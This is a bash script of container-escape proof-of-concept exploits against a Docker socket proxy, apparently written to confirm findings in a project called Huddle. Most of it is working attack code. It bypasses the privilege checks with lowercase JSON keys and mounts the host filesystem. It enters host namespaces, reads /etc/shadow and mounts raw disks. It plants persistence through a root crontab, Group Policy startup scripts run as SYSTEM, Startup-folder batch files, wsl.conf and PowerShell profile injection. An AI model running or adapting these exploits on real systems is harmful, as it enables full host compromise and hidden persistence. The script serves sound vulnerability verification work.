#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# Huddle host-escape PoC suite — one PoC per validated finding.
# AUTHORIZED SECURITY TESTING ONLY. Run inside a devcontainer of YOUR OWN Huddle
# instance to confirm the findings in docs/security/dind-findings-vs-main.md.
#
# All payloads are harmless: pop a calculator on the host and/or drop a proof
# file. No persistence, no exfiltration, no destruction. Each PoC self-cleans and
# exits 2 if the proxy refuses it (finding closed on that instance).
#
#   usage:  poc-suite.sh <name>
#   names:  1a   #1 top-level lowercase `hostconfig`      → pop calc (Go merges dupes)
#           1b   #1 nested lowercase keys under HostConfig → pop calc (host PID ns)
#           1c   #1 minimal: `binds` only                 → host-fs read+write
#           fs   #1 filesystem-only calc pop               → PS profile injection
#           recon recon: enumerate host fs for calc trigger paths
#           7    #7 privileged exec-create                → host raw-disk (best-effort)
#           mask MaskedPaths unmask (NON-destructive probe, no sysrq)
#           list show this table
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

NAME="${1:-list}"
IMAGE="${POC_IMAGE:-alpine:3.20}"
# alpine busybox lacks nsenter; we install util-linux inside the container.
# Use debian/ubuntu if you want it pre-installed: POC_IMAGE=ubuntu:24.04
API="http://d"
STAMP="poc-$$"

# ── socket ────────────────────────────────────────────────────────────────────
SOCK=""
[[ "${DOCKER_HOST:-}" == unix://* ]] && SOCK="${DOCKER_HOST#unix://}"
for c in "$SOCK" /var/run/huddle/docker.sock /var/run/dind/docker.sock /var/run/docker.sock; do
  [[ -n "$c" && -S "$c" ]] && { SOCK="$c"; break; }
done
[[ -S "${SOCK:-}" ]] || { echo "no docker proxy socket (set DOCKER_HOST)"; exit 1; }
CURL=(curl -s --unix-socket "$SOCK")

CLEAN_IDS=()
cleanup() { for id in "${CLEAN_IDS[@]:-}"; do [[ -n "$id" ]] && "${CURL[@]}" -X DELETE "$API/containers/$id?force=true" >/dev/null 2>&1 || true; done; }
trap cleanup EXIT

pull() { echo "[*] pull $IMAGE"; "${CURL[@]}" -X POST "$API/images/create?fromImage=${IMAGE%%:*}&tag=${IMAGE##*:}" >/dev/null || true; }

# create_raw <name> <json-body>  → prints CID (empty on refusal)
create_raw() {
  "${CURL[@]}" -X POST -H 'Content-Type: application/json' -d "$2" \
    "$API/containers/create?name=$1" | sed -n 's/.*"Id":"\([a-f0-9]*\)".*/\1/p'
}
run_and_log() { # <cid>
  "${CURL[@]}" -X POST "$API/containers/$1/start" >/dev/null
  "${CURL[@]}" -X POST "$API/containers/$1/wait" >/dev/null || true
  "${CURL[@]}" "$API/containers/$1/logs?stdout=true&stderr=true" | tr -d '\r' | sed 's/^/      /'
}
refused() { echo "[-] refused — finding closed on this instance (patched?)."; exit 2; }
b64() { printf '%s' "$1" | base64 | tr -d '\n'; }
cmd_json() { printf '["/bin/sh","-c","echo %s | base64 -d | /bin/sh"]' "$(b64 "$1")"; }

# payload that runs on the HOST via nsenter/chroot (needs host PID ns + bind /) ─
CALC_ON_HOST='set -x
# alpine busybox has no nsenter; install it
if ! command -v nsenter >/dev/null 2>&1; then
  apk add --no-cache util-linux >/dev/null 2>&1 || echo "[!] apk add util-linux failed"
fi

P=/tmp/huddle-escape-'"$STAMP"'.txt

# ── 1) write proof via nsenter (host namespaces) ──────────────
echo "[*] nsenter into host PID 1 ..."
nsenter -t 1 -m -u -i -n -p -- sh -c "
  echo \"PoC '"$STAMP"' host-exec\" > \"$P\"
  id >> \"$P\"
  uname -a >> \"$P\"
  hostname >> \"$P\"
  echo \"[+] proof written to host:$P\"
"
if [ $? -ne 0 ]; then
  echo "[!] nsenter failed — falling back to chroot /host"
  chroot /host sh -c "
    echo \"PoC '"$STAMP"' host-exec (chroot)\" > \"$P\"
    id >> \"$P\"
    uname -a >> \"$P\"
    hostname >> \"$P\"
    echo \"[+] proof written to host:$P\"
  "
fi

# ── 2) pop calc ──────────────────────────────────────────────
# Detect WSL2 vs native Linux
if [ -f /host/mnt/c/Windows/System32/cmd.exe ] || grep -qi microsoft /host/proc/version 2>/dev/null; then
  echo "[*] WSL2 detected — launching calc via Windows interop"
  # WSL2->Windows interop only works when WSL_INTEROP (pointing at the per-session
  # socket /run/WSL/<id>_interop) is present in the launching environment. nsenter
  # RESETS the environment, so a bare `nsenter -- cmd.exe` silently no-ops even
  # though the escape itself succeeded. pidmode:host gives us the host PID ns, so
  # harvest a live WSL_INTEROP value from any host process and pass it through.
  interop=""
  for e in /proc/*/environ; do
    v=$(tr "\0" "\n" < "$e" 2>/dev/null | sed -n "s/^WSL_INTEROP=//p" | head -1)
    [ -n "$v" ] && { interop="$v"; break; }
  done
  if [ -n "$interop" ]; then
    echo "[*] harvested WSL_INTEROP=$interop"
  else
    echo "[!] no WSL_INTEROP in host procs — interop launch may still no-op"
  fi
  # binfmt_misc: kernel needs WSLInterop entry to exec PE binaries via /init.
  # Inside nsenter context it may be missing — re-register if so (we are root).
  echo "[*] checking binfmt_misc WSLInterop in host namespace ..."
  nsenter -t 1 -m -u -i -n -p -- sh -c "
    if [ ! -d /proc/sys/fs/binfmt_misc ]; then
      mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc 2>/dev/null
    fi
    if [ -f /proc/sys/fs/binfmt_misc/WSLInterop ]; then
      echo \"[*] WSLInterop already registered\"
      head -2 /proc/sys/fs/binfmt_misc/WSLInterop
    else
      echo \"[*] WSLInterop missing — registering\"
      echo :WSLInterop:M::MZ::/init: > /proc/sys/fs/binfmt_misc/register 2>/dev/null \
        && echo \"[+] registered\" || echo \"[!] register failed\"
    fi
  "

  # runwin: enter host ns with WSL_INTEROP restored.
  runwin() { nsenter -t 1 -m -u -i -n -p -- env WSL_INTEROP="$interop" "$@"; }

  # Method A: cmd.exe via binfmt_misc (kernel routes MZ -> /init -> Windows)
  runwin /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
    && echo "[+] calc launched (cmd.exe via binfmt)" && exit 0
  # Method B: /init as explicit PE interpreter (bypasses binfmt entirely)
  runwin /init /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
    && echo "[+] calc launched (cmd.exe via /init)" && exit 0
  # Method C: powershell
  runwin /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -NoProfile -Command "Start-Process calc" 2>/dev/null \
    && echo "[+] calc launched (powershell)" && exit 0
  # Method D: /init + powershell
  runwin /init /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -NoProfile -Command "Start-Process calc" 2>/dev/null \
    && echo "[+] calc launched (powershell via /init)" && exit 0
  echo "[!] all WSL2 calc methods failed — check proof file instead: $P"
else
  echo "[*] native Linux — launching calc via nsenter"
  for calc in gnome-calculator kcalc xcalc xterm; do
    DISPLAY="${DISPLAY:-:0}" nsenter -t 1 -m -u -i -n -p -- "$calc" >/dev/null 2>&1 \
      && echo "[+] launched $calc" && exit 0
  done
  echo "[!] no GUI calculator found — check proof file: $P"
fi'

case "$NAME" in
# ── Finding #1a: top-level lowercase hostconfig key ──────────────────────────
1a)
  pull
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$CALC_ON_HOST"),\"hostconfig\":{\"privileged\":true,\"pidmode\":\"host\",\"binds\":[\"/:/host\"]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] created $CID (proxy saw body.HostConfig=undefined; Go merges dupe keys into same struct)"; run_and_log "$CID"
  ;;
# ── Finding #1b: proper HostConfig, but lowercase INNER keys ──────────────────
1b)
  pull
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$CALC_ON_HOST"),\"HostConfig\":{\"privileged\":true,\"pidmode\":\"host\",\"binds\":[\"/:/host\"]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] created $CID (guard checked HostConfig.Privileged=undefined)"; run_and_log "$CID"
  ;;
# ── Finding #1c: minimal — `binds` only, no privileged/pidmode ───────────────
# No host PID ns → can't pop GUI, but host root fs is mounted rw = full compromise.
1c)
  pull
  HOSTFS='set +e
P=/tmp/huddle-escape-'"$STAMP"'.txt
echo "PoC '"$STAMP"' host-fs write via binds-only bypass" > "/host$P"
echo "host hostname: $(cat /host/etc/hostname 2>/dev/null)"
echo "host /etc/shadow line 1: $(head -1 /host/etc/shadow 2>/dev/null)"
echo "wrote proof (host) $P"'
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$HOSTFS"),\"HostConfig\":{\"binds\":[\"/:/host\"]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] created $CID (host / mounted at /host, rw)"; run_and_log "$CID"
  ;;
# ── Finding #1 (fs): filesystem-only calc pop — multi-vector ──────────────────
# No privileged, no pidmode, no nsenter. Mount host rootfs via the 1b-style
# bypass (lowercase `binds` under properly-cased `HostConfig`).
# Host is Rancher Desktop WSL distro (Alpine/OpenRC, busybox crond).
# Five trigger mechanisms, fastest first:
#   1. /etc/crontabs/root + cron.update — 60-120 sec (busybox crond re-read)
#   2. GP Machine Startup scripts.ini  — next Windows boot, as SYSTEM
#   3. Windows user Startup folder     — next Windows logon
#   4. /etc/wsl.conf [boot] command=   — next WSL distro start
#   5. PowerShell profile injection    — next PS/Terminal session (if dir exists)
# All payloads self-remove after first execution.
fs)
  pull
  FSPOP='set +e
echo "[*] host rootfs at /host — deploying calc-pop triggers ..."
MARKER="HUDDLE_POC_CALCPOP"
TRIGGERED=0

# ── 1) busybox crond: every-minute crontab + cron.update signal [60-120 sec]
# busybox crond polls /etc/crontabs/ directory mtime every 60s. Writing to an
# existing file does NOT bump dir mtime — must create cron.update signal file
# (what `crontab -e` does internally). crond reads it on next tick, re-scans
# the named user crontab, then deletes the signal file.
CRONTAB="/host/etc/crontabs/root"
if [ -d "/host/etc/crontabs" ]; then
  # Write the payload script to host /tmp
  cat > /host/tmp/huddle-poc-calc.sh << "CALCEOF"
#!/bin/sh
# HUDDLE_POC_CALCPOP — fires once via crond, then self-cleans
export WSL_INTEROP="$(ls /run/WSL/*_interop 2>/dev/null | head -1)"
if [ -n "$WSL_INTEROP" ]; then
  /mnt/c/Windows/System32/cmd.exe /c start calc >/dev/null 2>&1 &
fi
# Self-cleanup: remove crontab entry and this script
sed -i "/huddle-poc-calc/d" /etc/crontabs/root 2>/dev/null
echo root > /etc/crontabs/cron.update
rm -f /tmp/huddle-poc-calc.sh
CALCEOF
  chmod +x /host/tmp/huddle-poc-calc.sh
  # Preserve existing crontab, prepend every-minute trigger
  if [ -f "$CRONTAB" ]; then
    ORIG=$(cat "$CRONTAB")
    printf "* * * * * /tmp/huddle-poc-calc.sh\n%s\n" "$ORIG" > "$CRONTAB"
  else
    echo "* * * * * /tmp/huddle-poc-calc.sh" > "$CRONTAB"
  fi
  # Signal crond to re-read NOW (not wait for dir mtime poll)
  echo root > /host/etc/crontabs/cron.update
  echo "[+] wrote crontab entry + cron.update signal (fires in 60-120 sec, self-cleans)"
  TRIGGERED=$((TRIGGERED + 1))
else
  echo "[!] no /etc/crontabs/ — busybox crond path unavailable"
fi

# ── 2) GP Machine Startup script [next Windows boot, runs as SYSTEM]
# Group Policy machine startup scripts fire before user logon.
# No domain/AD required — local GPO works on standalone machines.
GPDIR="/host/mnt/c/Windows/System32/GroupPolicy/Machine/Scripts/Startup"
GPINI="/host/mnt/c/Windows/System32/GroupPolicy/Machine/Scripts/scripts.ini"
if [ -d "/host/mnt/c/Windows/System32/GroupPolicy" ]; then
  mkdir -p "$GPDIR" 2>/dev/null
  cat > "$GPDIR/huddle-poc.bat" << "GPEOF"
@echo off
rem HUDDLE_POC_CALCPOP — GP Machine Startup, self-deleting
start calc
(goto) 2>nul & del "%~f0"
GPEOF
  # scripts.ini must use CRLF
  printf "[Startup]\r\n0CmdLine=huddle-poc.bat\r\n0Parameters=\r\n" > "$GPINI"
  echo "[+] wrote GP Machine Startup ($GPDIR/huddle-poc.bat + scripts.ini)"
  echo "    fires on next Windows boot as SYSTEM, before user logon, self-deletes"
  TRIGGERED=$((TRIGGERED + 1))
else
  echo "[!] no GroupPolicy dir — GP Startup path unavailable"
fi

# ── 3) Windows Startup folder [next Windows user logon]
for userdir in /host/mnt/c/Users/*/; do
  user=$(basename "$userdir")
  case "$user" in Public|Default|Default\ User|All\ Users) continue;; esac
  STARTUP="${userdir}AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
  [ -d "$STARTUP" ] || continue
  BAT="$STARTUP/huddle-poc.bat"
  cat > "$BAT" << "BATEOF"
@echo off
rem HUDDLE_POC_CALCPOP — self-deleting PoC
start calc
(goto) 2>nul & del "%~f0"
BATEOF
  echo "[+] wrote $BAT (fires on next Windows logon, self-deletes)"
  TRIGGERED=$((TRIGGERED + 1))
  break
done

# ── 4) /etc/wsl.conf [boot] command= [next WSL distro start]
WSLCONF="/host/etc/wsl.conf"
if ! grep -q "huddle-poc" "$WSLCONF" 2>/dev/null; then
  cat > /host/tmp/huddle-poc-boot.sh << "BOOTEOF"
#!/bin/sh
# HUDDLE_POC_CALCPOP — wsl.conf boot command, fires once, then self-cleans
export WSL_INTEROP="$(ls /run/WSL/*_interop 2>/dev/null | head -1)"
if [ -n "$WSL_INTEROP" ]; then
  /mnt/c/Windows/System32/cmd.exe /c start calc >/dev/null 2>&1 &
fi
sed -i "/huddle-poc/d" /etc/wsl.conf 2>/dev/null
rm -f /tmp/huddle-poc-boot.sh
BOOTEOF
  chmod +x /host/tmp/huddle-poc-boot.sh
  printf "\n[boot]\ncommand=/tmp/huddle-poc-boot.sh # huddle-poc\n" >> "$WSLCONF"
  echo "[+] appended [boot] command to wsl.conf (fires on next WSL distro start, self-cleans)"
  TRIGGERED=$((TRIGGERED + 1))
fi

# ── 5) PowerShell profile (fires on next PS/Terminal/VS Code terminal)
for userdir in /host/mnt/c/Users/*/; do
  user=$(basename "$userdir")
  case "$user" in Public|Default|Default\ User|All\ Users) continue;; esac
  for psdir in \
    "${userdir}Documents/WindowsPowerShell" \
    "${userdir}Documents/PowerShell"; do
    [ -d "$psdir" ] || continue
    PROF="$psdir/Microsoft.PowerShell_profile.ps1"
    grep -q "$MARKER" "$PROF" 2>/dev/null && continue
    echo "# ${MARKER}" >> "$PROF"
    echo "Start-Process calc; (Get-Content \$PROFILE | Where-Object { \$_ -notmatch '"'"'"${MARKER}"'"'"' }) | Set-Content \$PROFILE # ${MARKER}" >> "$PROF"
    echo "[+] injected into $PROF (fires on next PowerShell session, self-removes)"
    TRIGGERED=$((TRIGGERED + 1))
  done
done

echo ""
echo "[*] proof: host /etc/hostname = $(cat /host/etc/hostname 2>/dev/null)"
if [ "$TRIGGERED" -gt 0 ]; then
  echo "[+] deployed $TRIGGERED trigger(s). All self-remove after first execution."
  echo "[*] fastest path: crontab fires in 60-120 sec (no user interaction needed)"
else
  echo "[!] no trigger paths found — writing proof file instead"
  echo "HUDDLE HOST-ESCAPE PoC — filesystem write confirmed" > /host/tmp/huddle-poc-proof.txt
  echo "host: $(cat /host/etc/hostname 2>/dev/null)" >> /host/tmp/huddle-poc-proof.txt
  echo "[+] wrote /host/tmp/huddle-poc-proof.txt"
fi'
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$FSPOP"),\"HostConfig\":{\"binds\":[\"/:/host\"]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] created $CID (host / at /host via lowercase binds bypass)"; run_and_log "$CID"
  ;;
# ── Recon: enumerate host filesystem for calc trigger paths ──────────────────
recon)
  pull
  RECON='set +e
echo "=== HOST INFO ==="
echo "hostname: $(cat /host/etc/hostname 2>/dev/null)"
echo "os-release: $(head -3 /host/etc/os-release 2>/dev/null)"
echo ""
echo "=== /host/mnt/ (drive mounts) ==="
ls -la /host/mnt/ 2>/dev/null
echo ""
echo "=== Windows users ==="
for d in /host/mnt/c/Users/*/; do
  u=$(basename "$d")
  case "$u" in Public|Default|"Default User"|"All Users") continue;; esac
  echo "--- $u ---"
  echo "  Documents:     $(ls "$d/Documents/" 2>/dev/null | head -5)"
  echo "  PS5 profile:   $(ls "$d/Documents/WindowsPowerShell/" 2>/dev/null)"
  echo "  PS7 profile:   $(ls "$d/Documents/PowerShell/" 2>/dev/null)"
  echo "  OneDrive/Docs: $(ls "$d/OneDrive/Documents/" 2>/dev/null | head -5)"
  echo "  OneDrive/PS5:  $(ls "$d/OneDrive/Documents/WindowsPowerShell/" 2>/dev/null)"
  echo "  OneDrive/PS7:  $(ls "$d/OneDrive/Documents/PowerShell/" 2>/dev/null)"
  echo "  Startup:       $(ls "$d/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" 2>/dev/null)"
  echo "  AppData/Local: $(ls "$d/AppData/Local/" 2>/dev/null | head -10)"
done
echo ""
echo "=== ProgramData Startup ==="
ls -la "/host/mnt/c/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/" 2>/dev/null
echo ""
echo "=== Scheduled Tasks ==="
ls /host/mnt/c/Windows/System32/Tasks/ 2>/dev/null | head -10
echo ""
echo "=== /host/mnt/wsl/ (cross-distro) ==="
ls -la /host/mnt/wsl/ 2>/dev/null
echo ""
echo "=== WSL distros visible from Docker WSL ==="
for d in /host/mnt/wsl/*/; do [ -d "$d" ] && echo "$d: $(ls "$d" 2>/dev/null | head -5)"; done 2>/dev/null
echo ""
echo "=== binfmt_misc ==="
ls /host/proc/sys/fs/binfmt_misc/ 2>/dev/null
cat /host/proc/sys/fs/binfmt_misc/WSLInterop 2>/dev/null
echo ""
echo "=== running processes (host PID ns if pidmode:host) ==="
ps aux 2>/dev/null | head -20
echo ""
echo "=== cron/at ==="
ls /host/etc/cron.d/ /host/var/spool/cron/ /host/var/spool/at/ 2>/dev/null
crontab -l 2>/dev/null
echo ""
echo "=== init system ==="
ls /host/etc/init.d/ 2>/dev/null | head -10
cat /host/etc/inittab 2>/dev/null | head -5'
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$RECON"),\"HostConfig\":{\"binds\":[\"/:/host\"]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] recon container $CID"; run_and_log "$CID"
  ;;
# ── Finding #7: privileged exec-create ───────────────────────────────────────
# Create a NORMAL (allowed) container, then exec into it with Privileged:true.
# The exec gets all caps + device-cgroup allow-all → raw host block device.
# Environment-dependent (needs host block devices; WSL/virtiofs may lack them).
7)
  pull
  CID=$(create_raw "huddle-$STAMP" "{\"Image\":\"$IMAGE\",\"Cmd\":[\"sleep\",\"120\"],\"HostConfig\":{}}")
  [[ -z "$CID" ]] && { echo "[-] plain create refused (unexpected)"; exit 2; }
  CLEAN_IDS+=("$CID"); "${CURL[@]}" -X POST "$API/containers/$CID/start" >/dev/null
  echo "[+] owned container $CID started (non-privileged)"
  DISK='set +e
for d in /dev/sda /dev/vda /dev/nvme0n1 /dev/xvda; do
  [ -b "$d" ] || mknod "$d" b $(cat /sys/class/block/$(basename $d)/dev 2>/dev/null | tr ":" " ") 2>/dev/null
done
mkdir -p /m
for d in /dev/sda1 /dev/sda2 /dev/vda1 /dev/nvme0n1p1; do
  mount -o ro "$d" /m 2>/dev/null && { echo "MOUNTED host disk $d:"; head -1 /m/etc/hostname 2>/dev/null; umount /m; break; }
done
echo "priv-exec caps: $(grep CapEff /proc/self/status)"'
  EXECID=$("${CURL[@]}" -X POST -H 'Content-Type: application/json' \
    -d "{\"Privileged\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Cmd\":$(cmd_json "$DISK")}" \
    "$API/containers/$CID/exec" | sed -n 's/.*"Id":"\([a-f0-9]*\)".*/\1/p')
  [[ -z "$EXECID" ]] && refused
  echo "[+] privileged exec accepted: $EXECID (proxy never inspected the exec body)"
  "${CURL[@]}" -X POST -H 'Content-Type: application/json' -d '{"Detach":false,"Tty":false}' \
    "$API/exec/$EXECID/start" | tr -d '\r' | sed 's/^/      /'
  ;;
# ── MaskedPaths unmask — NON-destructive probe only ───────────────────────────
mask)
  pull
  PROBE='set +e
echo "kcore masked? $(ls -l /proc/kcore 2>&1 | grep -q " 0 " && echo yes || echo NO-unmasked)"
echo "sysrq-trigger present+writable? $([ -w /proc/sysrq-trigger ] && echo YES || echo no)"
echo "(refusing to write /proc/sysrq-trigger — that would be a destructive host action)"'
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$PROBE"),\"HostConfig\":{\"MaskedPaths\":[],\"ReadonlyPaths\":[]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] created $CID with empty MaskedPaths/ReadonlyPaths"; run_and_log "$CID"
  ;;
list|*)
  sed -n '11,17p' "$0"
  ;;
esac
